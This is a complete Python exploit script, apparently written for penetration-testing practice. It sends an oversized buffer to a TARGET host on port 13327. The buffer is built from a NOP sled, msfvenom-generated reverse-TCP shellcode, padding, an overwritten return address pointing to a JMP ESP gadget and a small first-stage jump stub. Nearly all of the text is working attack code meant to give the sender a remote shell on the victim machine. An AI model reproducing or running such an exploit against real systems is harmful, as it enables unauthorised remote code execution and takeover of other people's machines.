#!/usr/bin/python
# D4nk0St0rM
# spread l0vve & ln0wledge


import socket

host = "TARGET"

nop_sled = "\x90" * 8  # NOP sled to first place where AAAAAA was found in the initial testing

# msfvenom -p linux/x86/shell_reverse_tcp LHOST=MY_IP LPORT=813 -b "\x00\x20" -f py

shellcode =  ""
shellcode += "\xbe\x35\x9e\xa3\x7d\xd9\xe8\xd9\x74\x24\xf4\x5a\x29"
shellcode += "\xc9\xb1\x12\x31\x72\x12\x83\xc2\x04\x03\x47\x90\x41"
shellcode += "\x88\x96\x77\x72\x90\x8b\xc4\x2e\x3d\x29\x42\x31\x71"
shellcode += "\x4b\x99\x32\xe1\xca\x91\x0c\xcb\x6c\x98\x0b\x2a\x04"
shellcode += "\xb7\xfc\xb8\x46\xaf\xfe\x40\x67\x8b\x76\xa1\xd7\x8d"
shellcode += "\xd8\x73\x44\xe1\xda\xfa\x8b\xc8\x5d\xae\x23\xbd\x72"
shellcode += "\x3c\xdb\x29\xa2\xed\x79\xc3\x35\x12\x2f\x40\xcf\x34"
shellcode += "\x7f\x6d\x02\x36"

padding = "\x41" * (4368 -len(nop_sled) -len(shellcode))
eip = "\x96\x45\x13\x08"  # 0x08134596 Find address where JMP ESP resides
first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90" # (msf-nasm_shell add eax, jmp eax)

buffer = nop_sled + shellcode + padding + eip + first_stage

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print "[*]Sending evil buffer..."

s.connect((host, 13327))

print s.recv(1024)
s.send(buffer)
s.close()
print "[*]Payload Sent !"